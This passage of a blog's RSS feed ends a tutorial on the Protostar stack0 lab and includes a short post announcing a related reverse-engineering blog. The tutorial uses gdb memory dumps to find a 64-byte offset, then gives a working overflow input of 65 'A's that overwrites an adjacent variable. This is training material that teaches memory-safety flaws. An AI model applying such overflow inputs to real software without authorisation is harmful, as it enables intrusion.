&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/30x $esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0xb7eada75
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff770: 0xb7fd7ff4 0x08049620 0xbffff788 0x080482e8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff780: 0xb7ff1040 0x08049620 0xbffff7b8 0x08048469
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff7b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7b0: 0x08048450 0x00000000 0xbffff838 0xb7eadc76
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7c0: 0x00000001 0xbffff864
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This shows us that the stack pointer is at 0xbffff750, the value at esp+0x1c (i.e. 0xbffff76c) is some non-zero value and the value at esp+0x5c (i.e. 0xbffff7ac) is 0 (matches the variable initialization value). Let&amp;rsquo;s continue further to the next step, enter some known data as input and see the state of memory again.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Continuing.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 2, main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>1, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span> at stack0/stack0.c:13
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>13 in stack0/stack0.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/30x $esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0x41414141
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff770: 0x41414141 0x41414141 0xbffff700 0x080482e8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff780: 0xb7ff1040 0x08049620 0xbffff7b8 0x08048469
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff7b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7b0: 0x08048450 0x00000000 0xbffff838 0xb7eadc76
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7c0: 0x00000001 0xbffff864
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We entered &lt;code>AAAAAAAAAAAA&lt;/code> as the input, i.e., 12 &amp;lsquo;A&amp;rsquo; characters as input and notice that 12 bytes starting from 0xbffff76c onwards now reflect as 0x41 (which is the &lt;a href="http://www.asciitable.com/">ascii value&lt;/a> of A). So if we enter more number of As, we can continue overwriting more memory locations with 0x41 till we reach esp+0x5c. We can find the distance between the input variable and output variable addresses by doing this simple calculation of (esp+0x5c - esp+0x1c) or (0xbffff7ac - 0xbffff76c) which comes out to be 0x40 or 64. So, we need to input more than 64 As into the program to modify the variable and get the desired result.&lt;/p>
&lt;p>Try this out now on regular command line:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ ./stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>you have changed the &lt;span style="color:#e6db74">&amp;#39;modified&amp;#39;&lt;/span> variable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or if you know python&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ python -c &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;A&amp;#34;*65&amp;#39;&lt;/span> | ./stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>you have changed the &lt;span style="color:#e6db74">&amp;#39;modified&amp;#39;&lt;/span> variable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>SUCCESS!&lt;/p>
&lt;h3 id="references--lessons-learnt">References / Lessons learnt&lt;/h3>
&lt;p>So, in this article, we learnt:&lt;/p>
&lt;ul>
&lt;li>About a very basic buffer overflow on the stack and how to exploit it.&lt;/li>
&lt;li>Static and dynamic analysis portions of reverse engineering&lt;/li>
&lt;li>strings command&lt;/li>
&lt;li>Introduction to x86 assembly&lt;/li>
&lt;li>Several gdb commands&lt;/li>
&lt;li>We also learnt that usage of &lt;code>gets&lt;/code> function is very dangerous as it doesn&amp;rsquo;t have any kind of check on the amount of input coming from the user versus the space we have to save it.&lt;/li>
&lt;/ul>
&lt;p>You can refer to the below links for reading up more about some of the things discussed above. If you have any queries or suggestions, please leave a comment here or ping me &lt;a href="https://twitter.com/shantanugoel/">@shantanugoel&lt;/a>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.owasp.org/index.php/Buffer_Overflow">Buffer Overflow&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">Stack Buffer Overflow&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">X86 Assembly Reference&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://visualgdb.com/gdbreference/commands/">GDB Commands Reference&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>A New Resource For Reverse Engineering (and more)...</title><link>https://shantanugoel.com/2008/07/14/a-new-resource-for-reverse-engineering-and-more/</link><pubDate>Mon, 14 Jul 2008 14:18:32 +0000</pubDate><guid>https://shantanugoel.com/2008/07/14/a-new-resource-for-reverse-engineering-and-more/</guid><description>&lt;p>My brother &lt;a href="http://www.amitslab.com/rants/">Amit Goel&lt;/a> has started a tech blog, primarily about Reverse Engineering nuances, but he plans to write much more. Pay him a visit at &lt;a href="http://amitslab.com/blog/">Amits Lab&lt;/a> and let him know what topics you want him to discuss about.&lt;/p></description><content>&lt;p>My brother &lt;a href="http://www.amitslab.com/rants/">Amit Goel&lt;/a> has started a tech blog, primarily about Reverse Engineering nuances, but he plans to write much more. Pay him a visit at &lt;a href="http://amitslab.com/blog/">Amits Lab&lt;/a> and let him know what topics you want him to discuss about.&lt;/p></content></item></channel></rss>